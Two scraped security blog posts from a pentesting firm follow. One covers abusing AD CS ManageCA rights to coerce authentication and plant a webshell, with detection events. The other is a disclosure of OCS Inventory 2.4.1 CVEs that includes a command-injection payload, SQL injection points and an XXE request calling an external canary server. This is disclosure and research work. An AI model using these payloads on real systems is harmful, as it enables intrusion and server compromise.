=== Content from www.tarlogic.com_dc35e816_20250126_010138.html ===


* [Home](/)
* [Services](https://www.tarlogic.com/cybersecurity-services/)
  + Advanced penetration testing services
    - [Red Team services](https://www.tarlogic.com/red-team-services/)
    - [External & internal pentesting](https://www.tarlogic.com/penetration-testing-services/ "Penetration Testing services")
    - [Social Engineering](https://www.tarlogic.com/social-engineering/)
    - [Wi-Fi Pentest](https://www.tarlogic.com/wifi-pentest/)
    - Cyber intelligence services
    - [Threat Intelligence](https://www.tarlogic.com/threat-intelligence/)
    - [Digital surveillance](https://www.tarlogic.com/digital-surveillance/)
    - [Fraud investigation and analysis](https://www.tarlogic.com/fraud-investigation/ "Fraud investigation ")
    - [Strategic Cyber-Intelligence](https://www.tarlogic.com/strategic-cyber-intelligence/ "Strategic Cyber Intelligence")
  + Security assessment services
    - [Web Security Audit](https://www.tarlogic.com/website-security-audit/ "Website security audit")
    - [Mobile Application Security Test Audit](https://www.tarlogic.com/mobile-app-audit/ "Mobile application security audits")
    - [IOT Security testing](https://www.tarlogic.com/iot-security-testing/ "IoT Security assessment")
    - [Cloud Infrastructures security audit](https://www.tarlogic.com/cloud-security-assessment/ "Cloud security assessment")
    - [Reverse Engineering & Hardware Hacking](https://www.tarlogic.com/hardware-hacking-and-reverse-engineering-services/ "Reverse Engineering")
    - [Code Security Audit](https://www.tarlogic.com/code-security-audit/)
    - [Technologies and Operating Systems Hardening](https://www.tarlogic.com/operating-system-hardening/ "Hardening")
    - [Advanced Bank Infrastructures Security Assessment](https://www.tarlogic.com/advanced-bank-security-assessment/ "Bank Infrastructures Security Assessment")
  + Attack Surface Reduction services
    - [Vulnerability Management](https://www.tarlogic.com/vulnerability-management/ "Vulnerability management service")
    - [Emerging vulnerabilities 24×7](https://www.tarlogic.com/emerging-vulnerabilities/ "Emerging vulnerability management service")
    - [Denial of service simulation (DoS)](https://www.tarlogic.com/dos-test/ "Denial of service test")
    - [Managed Bug Bounty program](https://www.tarlogic.com/bug-bounty/ "Bug bounty service")
    - [Dynamic Risk Assessment and Threat Prioritization](https://www.tarlogic.com/threat-priorization/ "Threat Priorization")
    - Protection and response
    - [Threat Hunting services](https://www.tarlogic.com/threat-hunting/ "Threat Hunting")
    - [Incident Response Services](https://www.tarlogic.com/incident-response/ "Incident Response")
* [BlackArrow](https://www.tarlogic.com/blackarrow/)
* [Blog](https://www.tarlogic.com/blog/)
* [Contact](https://www.tarlogic.com/contact/ "Contactar con tarlogic")
* [EN](https://www.tarlogic.com/blog/ad-cs-manageca-rce/ "EN")
  + [ES](https://www.tarlogic.com/es/blog/ad-cs-manageca-rce/ "ES")

* EN
  + [ES](https://www.tarlogic.com/es/blog/ad-cs-manageca-rce/)

![BlackArrow blog header](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/bg_single_blog_blur.jpg)

[Home](https://www.tarlogic.com)
/
[Blog](https://www.tarlogic.com/blog/)
/
AD CS: from ManageCA to RCE

# AD CS: from ManageCA to RCE

14 - Feb - 2022
- Pablo Martínez, Kurosh Dabbagh

Table of Contents

* [Introduction](#Introduction "Introduction")
* [Abusing CRL Distribution Points (CDP)](#Abusing_CRL_Distribution_Points_CDP "Abusing CRL Distribution Points (CDP)")
* [Coercing remote authentication](#Coercing_remote_authentication "Coercing remote authentication")
* [Code execution via webshell deployment](#Code_execution_via_webshell_deployment "Code execution via webshell deployment ")
* [Detection](#Detection "Detection")
* [Conclusion](#Conclusion "Conclusion ")
## Introduction

In our previous article, we covered an engagement where it was necessary to execute the [ESC7 attack](https://www.tarlogic.com/blog/ad-cs-esc7-attack/) to escalate privileges by abusing the Active Directory Certificate Services (AD CS). During this [Red Team operation](https://www.tarlogic.com/red-team-services/), a detailed research was conducted and it resulted in the publication of several modules for Certify, which allow the abuse of the ManageCA and ManageCertificates permissions as suggested in the [original paper](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf).

Since the article was published, we have continued with this research, which has led us to discover **two new ways to compromise the CA** **server** (Certificate Authority) itself by abusing the **ManageCA** **privilege**. These attacks could be useful in different scenarios:

* When there are no certificate templates available for users that we can control, preventing the ESC6 and ESC7 attacks from being executed.
* In the circumstances where it is not possible to accomplish any of the attack scenarios proposed by SpecterOps, due to the impossibility of authenticating in the domain using certificates. We faced this problem in the engagement explained in our [previous article](https://www.tarlogic.com/blog/ad-cs-esc7-attack/).

* In any case where the target is the CA server and the information stored in it.

As a result, in this article we expose the following methods to compromise a CA by abusing the CDP extension:

* Coerce the CA to authenticate to a remote server, opening the door to **NTLM relay attacks**, among others.
* Obtain **remote code execution** on the CA server by writing a webshell.

Furthermore, we will release [**two new Certify modules**](https://github.com/blackarrowsec/Certify) to allow the automatic exploitation of these new attack vectors.

## Abusing CRL Distribution Points (CDP)

A **CRL** (Certificate Revocation List) is a **file** containing the identifiers of the certificates that have been **revoked** and are no longer valid. The CA must periodically publish the CRL in an accessible path, so the clients can check the validity of a certificate. This can be done by indicating one or more CDPs in its configuration:

[![CDP extension setup](data:image/gif;base64...)](https://www.blackarrow.net/wp-content/uploads/2022/02/IMG1_lista_cdps-1.png)

*CDP extension setup*

When setting up a new CDP, we can specify either a local or remote path using several network protocols (HTTP, LDAP, FTP or SMB). Also, we must select if the CDP is used for reading, writing or both:

* **CDP for reading** (using the “*Include in the CDP extension of issued certificates*” option): the path will be added in the CDP extension of issued certificates, to indicate clients where to find a CRL. Only three protocols can be used to specify read CDPs, which are HTTP, FTP and LDAP.
* **CDP for writing** (through the option “*Publish CRLs to this location*“): a local or remote path where the CRL will be published. To specify a remote path, only LDAP and SMB protocols are supported, and the CA server must have write access to the provided remote location.

Since a normal CRL contains the identifiers of all the revoked certificates prior to its publication (known as a **Base CRL**), the size of these files can increase considerably after a certain period of time, which can cause a significant network traffic growth due to the clients downloading them just to verify a single certificate.

To optimize this process, a **Delta CRL** can be used, which will only contain the identifiers of the revoked certificates since the last CRL publication. Additionally, to ensure that the verifier finds the Delta CRLs, the CA allows to include their location inside the **Base CRL** file (using the “*Include in CRLs*” check). This option will be important when exploiting one of the attack vectors that we are going to discuss next.

## Coercing remote authentication

As we have already mentioned, it is possible to define in the CA a CDP for writing via the SMB protocol using the syntax `file://remote.server/folder/file.crl`. This allows to add a shared folder hosted on a remote machine as the publication path of a CRL, even if it is not part of the domain. This behavior makes sense since certificates may need to be verified beyond the limits of the Active Directory.

If the shared folder requires authentication, the CA server **will try to authenticate in order to access the folder** (using NTLM or Kerberos, depending on whether the UNC path uses an IP or a hostname as its CDP). This means that a user with the ManageCA permission can retrieve a NTLM challenge from the server opening the door to **NTLM relay** attacks. Likewise, if you have in your control an account with **Kerberos Unconstrained Delegation** enabled, it would be possible to obtain a valid TGT for the CA server.

[![Setup CDP to force a NTLM authentication against an arbitrary server](data:image/gif;base64...)![Setup CDP to force a NTLM authentication against an arbitrary server](https://www.blackarrow.net/wp-content/uploads/2022/02/IMG2_writing_crl-1.png)](https://www.blackarrow.net/wp-content/uploads/2022/02/IMG2_writing_crl-1.png)

*Setup CDP to force a NTLM authentication against an arbitrary server*

Since Microsoft published the **MS16-075** patch, relaying a NTLM authentication to the same machine stopped being a possibility (even cross-protocol), so this primitive can’t be used to relay to the same CA’s web inscription service to request a new certificate (an attack path related to ESC8). However, if there are more CAs available in the environment, you can successfully relay to **another CA’s web enrollment service** and get a valid certificate for the vulnerable CA:

[![ntlmrelaxy.py NTLM relay from one CA to another](data:image/gif;base64...)![ntlmrelaxy.py NTLM relay from one CA to another](https://www.blackarrow.net/wp-content/uploads/2022/02/IMG3_ntlmrelay-1-1024x453.png)](https://www.blackarrow.net/wp-content/uploads/2022/02/IMG3_ntlmrelay-1.png)

*NTLM relay from one CA to another*

While this case of abuse requires the presence of several CAs, we do not consider this to be uncommon in environments of significant size, where multiple CAs or **SubCAs** may coexist.

This method for **coercing authentication** was also implemented as a new module (`coerceauth`) for Certify:

[![Using Certify to force the CA server to authenticate against a remote IP](data:image/gif;base64...)![Using Certify to force the CA server to authenticate against a remote IP](https://www.blackarrow.net/wp-content/uploads/2022/02/IMG4_coerce-1-1024x350.png)](https://www.blackarrow.net/wp-content/uploads/2022/02/IMG4_coerce-1.png)

*Using Certify to force the CA server to authenticate against a remote IP*

After triggering the connection, this module will restore the previous configuration, to avoid leaving behind a non-existent CDP.

## Code execution via webshell deployment

Since the **recommended** method for downloading and consuming CRLs is via the HTTP protocol, one of the hypotheses raised during the research was the abuse of CDPs to **deploy webshells**. Moreover, this assumption became even stronger when we realized that a CDP can write files with **any extension**, instead of the expected one (`.crl`).

The main challenge was to reliably control some contents of the created file, especially since webshell code often uses problematic characters such as `<`, `%` or `>`.

Our first approach was to request certificates with the malicious content inserted in different fields, hoping that when the certificates were revoked this information would be inserted into the CRL. However, we did not find any field in the certificates sufficiently large and malleable to be able to carry out this process.

After multiple attempts, we recalled the previously mentioned option that allows us to **add the path of a Delta CRL inside a Base CRL**. We realized that this way it was possible to partially control the contents of the published CRLs.

Using this feature, we can successfully deploy a webshell through the following steps:

* Create a **first CDP** to write a CRL in the desired path, adding the appropriate extension (e.g. `.asp`).

* Specify a **second malicious CDP** with the webshell payload as path, which would be inserted inside the CRL generated by the first CDP.

[![Partial file write](data:image/gif;base64...)![Partial file write](https://www.blackarrow.net/wp-content/uploads/2022/02/IMG5_writing_text-1.png)](https://www.blackarrow.net/wp-content/uploads/2022/02/IMG5_writing_text-1.png)

*Partial file write*

As a first attempt, we tried to write a minimal ASP webshell in the local web directory `C:\inetpub\wwwroot`, which is created when installing any of the web roles available within the Active Directory Certificate Services (AD CS), as we will discuss later.

[![Error when using the percentage symbol](data:image/gif;base64...)![Error when using the percentage symbol](https://www.blackarrow.net/wp-content/uploads/2022/02/IMG6_replacement_tokens_errror-1.png)](https://www.blackarrow.net/wp-content/uploads/2022/02/IMG6_replacement_tokens_errror-1.png)

*Error when using the percentage symbol*

When performing this test, we got an error due to the use of the `%` character when inserting our malicious CDP. This is because CDPs make use of a feature known as [replacement tokens](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc784969%28v%3Dws.10%29), which are strings composed by a percentage sign followed by an index number. Depending on this index, they are replaced with a different value, therefore allowing the creation of dynamic CDPs.

If we compare the default CDPs of a CA with the value stored in the corresponding registry key (`HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CAName>\`
`CRLPublicationURLs`), we can notice that, although the replacement tokens are stored in the registry, their value is dynamically replaced by the corresponding strings when the configuration is read by the CA.

[![Correlation between default CDPs and values stored in the registry](data:image/gif;base64...)![Correlation between default CDPs and values stored in the registry](https://www.blackarrow.net/wp-content/uploads/2022/02/IMG7_registry_equivalence-1.png)](https://www.blackarrow.net/wp-content/uploads/2022/02/IMG7_registry_equivalence-1.png)

*Correlation between default CDPs and values stored in the registry*

After reverse engineering the AD CS service process (certsrv.exe) we were able to identify that the `certsrv.exe!myFormatCertsrvStringArray` function generates an array with the replacement tokens values. Then, after calling `certsrv.exe!myFormatMessageFromSource` it ends up invoking the [FormatMessageW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-formatmessagew) function to generate the final path. Internally, this function is the one that performs the substitution of the replacement token occurrences by the corresponding values stored in the array. In addition, the CA also makes use of the [InternetCanonicalizeUrlW](https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetcanonicalizeurlw) function to complete the process of filtering and canonicalizing the inserted path.

[![Snippet from the decompiled certsrv.exe!myFormatCertsrvStringArray function](data:image/gif;base64...)![Snippet from the decompiled certsrv.exe!myFormatCertsrvStringArray function](https://www.blackarrow.net/wp-content/uploads/2022/02/IMG8_ida-1.png)](https://www.blackarrow.net/wp-content/uploads/2022/02/IMG8_ida-1.png)

*Snippet from the decompiled certsrv.exe!myFormatCertsrvStringArray function*

It is worth noting that the `FormatMessageW` function allows the use of format strings by using the `%n!format string!` syntax. We can acknowledge this behavior, for example, by printing in a CRL the memory address of the first element inside the array (e.g. `%1!p!`):

[![Memory address printed using format string expansion](data:image/gif;base64...)![Memory address printed using format string expansion](https://www.blackarrow.net/wp-content/uploads/2022/02/IMG9_formatmessage_address-1.png)](https://www.blackarrow.net/wp-content/uploads/2022/02/IMG9_formatmessage_address-1.png)

*Memory address printed using format string expansion*

While this could open the door to Format String Attacks or memory corruptions, we have not seen any way to introduce non-printable characters. That said, it is possible to **cause a denial of service** in the CA by specifying a CDP with a format string that expands to a size larger than **2^16** (e.g. `%1!65536s!`).

After identifying the process of formatting and filtering URLs done by the CA, it will be necessary to [escape certain special characters](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-formatmessage#remarks) using `%` so that they do not disappear after the substitutions made by FormatMessageW. On the other hand, we also noticed that adding a line break (`%n`) at the beginning of the CDP **bypasses part of the filtering** performed by the `InternetCanonicalizeUrlW` function.

Considering all the above, we decided to implement a new Certify module that allows to write an arbitrary file to a local or remote path through the CDP extension. We once again made use of the  `ICertAdmin2::SetConfigEntry` DCOM method to modify the value of the **CRLPublicationURLs** registry key:

[![Using Certify to write a webshell using a local ASP file as input](data:image/gif;base64...)![Using Certify to write a webshell using a local ASP file as input](https://www.blackarrow.net/wp-content/uploads/2022/02/IMG10_shell1-1-1024x379.png)](https://www.blackarrow.net/wp-content/uploads/2022/02/IMG10_shell1-1.png)

*Using Certify to write a webshell using a local ASP file as input*

Also, if no input file is specified via the `/input` flag, a default ASP or PHP webshell is written depending on the extension of the destination path:

[![Example of default webshell generated if no input file is specified](data:image/gif;base64...)![Example of default webshell generated if no input file is specified](https://www.blackarrow.net/wp-content/uploads/2022/02/IMG11_webshell-1-1024x340.png)](https://www.blackarrow.net/wp-content/uploads/2022/02/IMG11_webshell-1.png)

*Example of default webshell generated if no input file is specified*

This way, a user with the **ManageCA** permission gets the ability to perform an arbitrary file write on any local path on the CA server or on any remote path where that server has write permissions. Besides, we managed to partially control the content of this file as well as its extension, allowing us to obtain remote code execution through the deployment of a webshell. By default, the webshell is executed in the context of the Application Pool identity (DefaultAppPool user), so it is possible to elevate privileges to SYSTEM by abusing the `SeImpersonate` privilege.

Likewise, it should be noted that the CA itself is responsible for writing the CRLs, which process is executed with `NT AUTHORITY\SYSTEM` privileges. This means that we can write to any local path and overwrite any file on the system. Although this could be used in other ways that we have not detected, the fact of not being able to completely control the content of the CRL and not being able to insert binary content reduces the chances of exploitation. Regardless, this attack vector could be used to **remotely corrupt the CA server** by overwriting system files.

At this point, the major issue that we can face is the lack of a web server in the CA where to host our webshell. Therefore, we have verified in our lab that the installation of any of the different AD CS web roles includes the installation of an IIS server, where the default web directory is located at `C:\inetpub\wwwroot`.

Depending on the installed roles, there will be support for ASP or ASPX files, and we can detect which ones are installed based on the available endpoints:

[![AD CS paths](data:image/gif;base64...)![AD CS paths](https://www.blackarrow.net/wp-content/uploads/2022/02/ADCS_roles_tables-1.png)](https://www.blackarrow.net/wp-content/uploads/2022/02/ADCS_roles_tables-1.png)

During our tests, we have detected that writing a webshell in `C:\Windows\System32` is immediately detected by Windows Defender.

If no web services are installed on the CA server, it might be possible that there is an already configured CDP pointing to an external web server, where a webshell could be written. This [Microsoft article](https://techcommunity.microsoft.com/t5/configuration-manager-archive/how-to-publish-the-crl-on-a-separate-web-server/ba-p/272748) explains several scenarios in which the use of a separate server might be necessary, reason why the new Certify module allows to specify local or remote paths.

To detect potential remote web directories where the CA is already publishing CRLs and consequently has write permissions, a `/readonly` flag has been added to the `writefile` command in order to read the CA’s list of CDPs without messing with them:

[![Using Certify to list current CDP list](data:image/gif;base64...)![Using Certify to list current CDP list](https://www.blackarrow.net/wp-content/uploads/2022/02/IMG12_listcdp-1-1024x379.png)](https://www.blackarrow.net/wp-content/uploads/2022/02/IMG12_listcdp-1.png)

*Using Certify to list current CDP list*

## Detection

In terms of detecting these attacks, the best option is to enable auditing of AD CS-related events as indicated in the original paper. Once enabled, we can monitor the following events:

* **Event 4871** (“*Certificate Services received a request to publish the certificate revocation list*“): since the publication of CRLs is usually an automatic activity that occurs every certain time set in the CA configuration, the generation of this event outside those time periods may be an indicator of the malicious activity described in this article.
* **Event 4872** (“*Certificate Services published the certificate revocation list (CRL)*“): analyzing the URL and extension of the CDP could allow to detect suspicious activity related to the writing of malicious CRL files.

[![security Event 4872 generated when publishing a CRL](data:image/gif;base64...)![security Event 4872 generated when publishing a CRL](https://www.blackarrow.net/wp-content/uploads/2022/02/IMG13_event-1.png)](https://www.blackarrow.net/wp-content/uploads/2022/02/IMG13_event-1.png)

*Event 4872, generated when publishing a CRL*

## Conclusion

This second article dedicated to AD CS led us to discover new methods in which users with the ManageCA permission can **compromise the CA server** by leveraging the CDP extension.

On the other hand, we have added two new modules to Certify that allow the automatic exploitation of the attack vectors explained in this article. These features, as well as those published in the previous article, can be found in the [BlackArrow repository](https://github.com/blackarrowsec/Certify).

More articles in this series about AD CS

This article is part of a series of articles about AD CS

1. [AD CS: weaponizing the ESC7 attack](https://www.tarlogic.com/blog/ad-cs-esc7-attack/)
2. AD CS: from ManageCA to RCE

Share this article

[Facebook](https://www.facebook.com/sharer.php?u=https://www.tarlogic.com/blog/ad-cs-manageca-rce/) -
[Twitter](https://x.com/share?text=AD CS: from ManageCA to RCE&url=https://www.tarlogic.com/blog/ad-cs-manageca-rce/) -
[Linkedin](https://www.linkedin.com/shareArticle?mini=true&url=https://www.tarlogic.com/blog/ad-cs-manageca-rce/&title=AD CS: from ManageCA to RCE&summary=Disclosure of two novel techniques to attack and compromise a CA server by abusing the ManageCA permissions (AD CS))

##### Related Posts

[![Hindering Threat Hunting, a tale of evasion in a restricted environment](data:image/gif;base64...)](https://www.tarlogic.com/blog/threat-hunting-evasion-restricted-environment/)
[###### Hindering Threat Hunting, a tale of evasion in a restricted environment](https://www.tarlogic.com/blog/threat-hunting-evasion-restricted-environment/)
Written by:
- Borja Merino

24 - November - 2020

[![Persistence in WordPress using backdoors in SQL](data:image/gif;base64...)](https://www.tarlogic.com/blog/backdoors-in-sql-wordpress/)
[###### Persistence in WordPress using backdoors in SQL](https://www.tarlogic.com/blog/backdoors-in-sql-wordpress/)
Written by:
- Juan Manuel Fernandez

15 - May - 2017

[![Vulnerabilities in Ampache (<=3.9.1)](data:image/gif;base64...)](https://www.tarlogic.com/blog/vulnerabilities-in-ampache/)
[###### Vulnerabilities in Ampache (<=3.9.1)](https://www.tarlogic.com/blog/vulnerabilities-in-ampache/)
Written by:
- Pablo Martinez

21 - August - 2019

## How can we help you?

Contact our cybersecurity team for any questions or if you are in need of an assessment!

[Contact](https://www.tarlogic.com/contact/)

![world](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/blackarrow-tarlogic-cybersecurity-company-footer_blur.webp)

###### BUSINESS UNITS

* [CYBERSECURITY](https://www.tarlogic.com/cybersecurity-services/ "CYBERSECURITY SERVICES")
* [CYBER INTELLIGENCE](https://www.tarlogic.com/cyber-intelligence/ "CYBER INTELLIGENCE SERVICES")
* [BLACKARROW](https://www.tarlogic.com/blackarrow/ "BLACKARROW SERVICES")

###### CONTACT INFO

[EUROPE HQ:
Madrid
 Quintanavides 13-23,
 Business Park Vía Norte 2nd building,
 Las Tablas, 28050](https://www.google.com/maps?cid=15171011320439567448)
 (+34) 912 919 319

 contact@tarlogic.com

###### LINKS

* [Cybersecurity Products](https://www.tarlogic.com/cybersecurity-products/)
* [Cybersecurity Careers](https://www.tarlogic.com/cybersecurity-jobs-careers/)
* [Cybersecurity Glossary](https://www.tarlogic.com/cybersecurity-glossary/)
* [Tarlogic News](https://www.tarlogic.com/news/)
* [Cybersecurity company (About us)](https://www.tarlogic.com/about-tarlogic/)
* [BSAM Bluetooth Security Methodology](https://www.tarlogic.com/bsam/)
* [Sectors](https://www.tarlogic.com/sectors/)
* [Partner Channel](https://www.tarlogic.com/partners/)

© 2025 all rights reserved Tarlogic | Cyber security and Cyber intelligence experts

[Privacy policy](https://www.tarlogic.com/privacy-policy/) - [Legal notice](https://www.tarlogic.com/legal-notice/) - [Management policy](https://www.tarlogic.com/management-policy/) - [Cookies policy](https://www.tarlogic.com/cookies-policy/) - [Whistle-blower channel](https://tarlogic-security.factorialhr.es/complaints)

We are using cookies to give you the best experience on our website. You can find out more about which cookies we are using or switch them off in Cookies Settings

I agree

###### Necessary

Strictly Necessary Cookie should be enabled at all times so that we can save your preferences for cookie settings.

Necessary cookies
###### 3rd Party Cookies

This website uses Google Analytics to collect anonymous information such as the number of visitors to the site, and the most popular pages.
Keeping this cookie enabled helps us to improve our website.

3rd party cookies

Enable all
Save settings
[Cookies policy](https://www.tarlogic.com/cookies-policy/)

[Contact us now 💬](#top)



=== Content from www.tarlogic.com_87dd7975_20250124_120902.html ===


* [Home](/)
* [Services](https://www.tarlogic.com/cybersecurity-services/)
  + Advanced penetration testing services
    - [Red Team services](https://www.tarlogic.com/red-team-services/)
    - [External & internal pentesting](https://www.tarlogic.com/penetration-testing-services/ "Penetration Testing services")
    - [Social Engineering](https://www.tarlogic.com/social-engineering/)
    - [Wi-Fi Pentest](https://www.tarlogic.com/wifi-pentest/)
    - Cyber intelligence services
    - [Threat Intelligence](https://www.tarlogic.com/threat-intelligence/)
    - [Digital surveillance](https://www.tarlogic.com/digital-surveillance/)
    - [Fraud investigation and analysis](https://www.tarlogic.com/fraud-investigation/ "Fraud investigation ")
    - [Strategic Cyber-Intelligence](https://www.tarlogic.com/strategic-cyber-intelligence/ "Strategic Cyber Intelligence")
  + Security assessment services
    - [Web Security Audit](https://www.tarlogic.com/website-security-audit/ "Website security audit")
    - [Mobile Application Security Test Audit](https://www.tarlogic.com/mobile-app-audit/ "Mobile application security audits")
    - [IOT Security testing](https://www.tarlogic.com/iot-security-testing/ "IoT Security assessment")
    - [Cloud Infrastructures security audit](https://www.tarlogic.com/cloud-security-assessment/ "Cloud security assessment")
    - [Reverse Engineering & Hardware Hacking](https://www.tarlogic.com/hardware-hacking-and-reverse-engineering-services/ "Reverse Engineering")
    - [Code Security Audit](https://www.tarlogic.com/code-security-audit/)
    - [Technologies and Operating Systems Hardening](https://www.tarlogic.com/operating-system-hardening/ "Hardening")
    - [Advanced Bank Infrastructures Security Assessment](https://www.tarlogic.com/advanced-bank-security-assessment/ "Bank Infrastructures Security Assessment")
  + Attack Surface Reduction services
    - [Vulnerability Management](https://www.tarlogic.com/vulnerability-management/ "Vulnerability management service")
    - [Emerging vulnerabilities 24×7](https://www.tarlogic.com/emerging-vulnerabilities/ "Emerging vulnerability management service")
    - [Denial of service simulation (DoS)](https://www.tarlogic.com/dos-test/ "Denial of service test")
    - [Managed Bug Bounty program](https://www.tarlogic.com/bug-bounty/ "Bug bounty service")
    - [Dynamic Risk Assessment and Threat Prioritization](https://www.tarlogic.com/threat-priorization/ "Threat Priorization")
    - Protection and response
    - [Threat Hunting services](https://www.tarlogic.com/threat-hunting/ "Threat Hunting")
    - [Incident Response Services](https://www.tarlogic.com/incident-response/ "Incident Response")
* [BlackArrow](https://www.tarlogic.com/blackarrow/)
* [Blog](https://www.tarlogic.com/blog/)
* [Contact](https://www.tarlogic.com/contact/ "Contactar con tarlogic")
* [EN](https://www.tarlogic.com/blog/vulnerabilities-in-ocs-inventory-2-4-1/ "EN")
  + [ES](https://www.tarlogic.com/es/blog/vulnerabilidades-ocs-inventory-2-4-1/ "ES")

* EN
  + [ES](https://www.tarlogic.com/es/blog/vulnerabilidades-ocs-inventory-2-4-1/)

![BlackArrow blog header](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/bg_single_blog_blur.jpg)

[Home](https://www.tarlogic.com)
/
[Blog](https://www.tarlogic.com/blog/)
/
Vulnerabilities in OCS Inventory 2.4.1

# Vulnerabilities in OCS Inventory 2.4.1

10 - Sep - 2018
- Juan Manuel Fernandez

Table of Contents

* [Introduction](#Introduction "Introduction")
* [CVE-2018-12483 – Remote Command Execution](#CVE-2018-12483_%E2%80%93_Remote_Command_Execution "CVE-2018-12483 – Remote Command Execution")
* [CVE-2018-12482 – Multiple SQL Injections](#CVE-2018-12482_%E2%80%93_Multiple_SQL_Injections "CVE-2018-12482 – Multiple SQL Injections")
* [CVE-2018-14473 – XXE](#CVE-2018-14473_%E2%80%93_XXE "CVE-2018-14473 – XXE")
* [Conclusion](#Conclusion "Conclusion")
* [Greetings](#Greetings "Greetings")

During a [Red Team operation](https://www.tarlogic.com/red-team-services/), multiple vulnerabilities were discovered in OCS Inventory (version 2.4.1). The following CVEs have been assigned to the vulnerabilities:

* CVE-2018-12482 (Multiple SQL Injections in the search engine)
* CVE-2018-12483 (Remote Command Execution)
* CVE-2018-14473 (XXE).

### Introduction

**OCS Inventory** is a inventory software widely used in corporations to monitor their computers via agents (for Linux and Windows) that are deployed inside the machines. The agents collect information from the computers and send it to a HTTP endpoint located in a master server. Likewise, in addition to monitoring, OCS Inventory allows the installation of software and the execution of OS commands from the master server to the computers where an agent is installed. Due to these capabilities, this product becomes a critical asset and therefore an asset of special interest for an attacker. If the OCS Inventory server gets compromised the attacker would be able deploy any kind of software inside the machines where an agent is deployed.

In the operation, the Red Team identified the existence of this software inside the client network, so, the logical procedure was to install a local copy of OCS Inventory to analyze it’s inner workings and to uncover vulnerabilities that could be used in the operation.

### CVE-2018-12483 – Remote Command Execution

When the code of “OCSReports” component is analyzed, the use of an external perl script for IP discovery is quickly observed:

```
function runCommand($command = "", $fname) {
    $command = "perl ipdiscover-util.pl $command -xml -h=" . SERVER_READ . " -u=" . COMPTE_BASE . " -p=" . PSWD_BASE . " -d=" . DB_NAME . " -path=" . $fname;
    exec($command);
}
```

The perl script is executed as a system command via exec() function, where it takes as argument a text string where the parameters have been concatenated. If we proceed to the search of references to this function within the source code, a unique match is identified:

```
//ms_ipdiscover_analyse.php

$pas = $protectedGet['rzo'];
$values = look_config_default_values(array('IPDISCOVER_IPD_DIR'), '', array('IPDISCOVER_IPD_DIR' => array('TVALUE' => VARLIB_DIR)));
$fname = $values['tvalue']['IPDISCOVER_IPD_DIR'];
$file_name = $fname . "/ipd/" . $pas . ".ipd";
//reset cache?
if (is_defined($protectedPost['reset'])) {
    unlink($file_name);
    reloadform_closeme('', true);
} else {
    if (!is_readable($file_name))
        runCommand("-cache -net=" . $pas, $fname);
```

The parameters provided to the runCommand function lack any filtering, so it is possible to abuse this functionality in order to execute arbitrary commands in the OS. Since we have the control of $pas (as it acquires its value from the GET parameter “rzo”), we can insert commands by the creation of a string like this one:

```
perl ipdiscover-util.pl -cache -net=;id > /tmp/pwned;#-xml -h=...
```

For the exploitation of this vulnerability it is necessary to be authenticated in the web platform, so if a valid user is not available another option is to hijack a session via the exploitation of any XSS from the myriad it has. In the context of the RedTeam exercise where the vulnerability was discovered, it was decided to force an authenticated user to load in their browser an image pointing to an URL with the payload (the browser sends a GET request with the malicious payload when the image is viewed).

### CVE-2018-12482 – Multiple SQL Injections

The search engine implemented in OCS Inventory does not perform an adequate filtering of the parameters used within SQL statements, making it possible to inject arbitrary SQL code. For highlighting some injection points:

* GET and POST parameter “values” when searching from the section “Inventory -> Search with various criteria data”. When you select a search tag (for example “Network: IPADDRESS”), the SQL statement remains such that:

```
select distinct HARDWARE_ID,networks.DESCRIPTION as 'Network: Description',networks.TYPE as 'Network: Type',networks.TYPEMIB as 'Network: MibType',networks.SPEED as 'Network: Speed',networks.MACADDR as 'Network: MAC Address',networks.STATUS as 'Network: Status',networks.IPADDRESS as 'Network: IP Address',networks.IPMASK as 'Network: IP Netmask',networks.IPSUBNET as 'Network: Subnetwork IP',networks.IPGATEWAY as 'Network: Gateway IP',networks.IPDHCP as 'Network: DHCP IP' from networks where ( ( IPADDRESS = '[INJECT HERE]'))

```

By not filtering properly, we can break the sentence with a single quote (‘) and inject our payload.

* Parameters length, order and start. These parameters used for the limit and order clauses of the SQL statement are not filtered properly, allowing the execution of arbitrary queries in the same way:

```
(Example: POST parameter length)
... GROUP BY netid) non_ident on non_ident.RSX=inv.RSX) toto order by ID asc limit 0 ,[inject here]
```
### CVE-2018-14473 – XXE

The communication between the agents and the master server of OCS Inventory is done through the HTTP protocol, sending the information against an endpoint. The information is structured in the form of XML, being parsed by the server to extract the data. Due to an inadequate configuration it is possible to use external entities, which when processed by the XML parser, allow the exfiltration of sensitive information from the machine.

As proof of concept, a local web server can be raised on the user’s machine, as a canary, and send the following request against the endpoint:

```
POST /ocsinventory HTTP/1.1
Host: xxxxxxxxxxxxxxx
User-Agent: OCS-NG_WINDOWS_AGENT_v2.3.1.1
Accept: */*
Content-Type: application/xml
Content-Length: 160
Expect: 100-continue
Connection: close
<?xml version="1.0" encoding=""UTF-8" ?>
<!DOCTYPE r [
      <!ELEMENT r ANY >
      <!ENTITY sp SYSTEM "https://ourserver/?pwned">
>
<REQUEST>&sp;</REQUEST>
```

When the XML is processed, the entity &sp; expands and the OCS Inventory server makes a request against our canary, verifying the existence of the vulnerability.

### Conclusion

One of the most standout characteristics of Tarlogic’s Red Team is It’s dedication to analyze the software used by It’s clients in order to find vulnerabilities that can be exploited in a real life scenario.These activities result in many occasions in the discovery of 0-days. Some of them that are found to be more interesting are shown in this blog (like the present post, or as was done with the [RCE of Cobian Backup](https://www.tarlogic.com/blog/cobian-backup-11-rce-cve-2017-11318/), and others are only reported to the pertinent authorities (as was done with the [Switch UbiQuoss VP5208A](https://www.tarlogic.com/blog/ubiquoss-switch-vulnerability-cve-2018-10024/)).

Always consider the possibility that an attacker uses unpublished vulnerabilities to compromise a machine. It is at this point where the measures implemented during the [systems hardening](https://www.tarlogic.com/operating-system-hardening/) phase should make lateral movement and escalation of privileges more difficult or even impossible. Likewise, the implementation of WAFs in this type of critical internal applications can prevent or make much more complicated to exploit this kind of vulnerabilities in web applications.

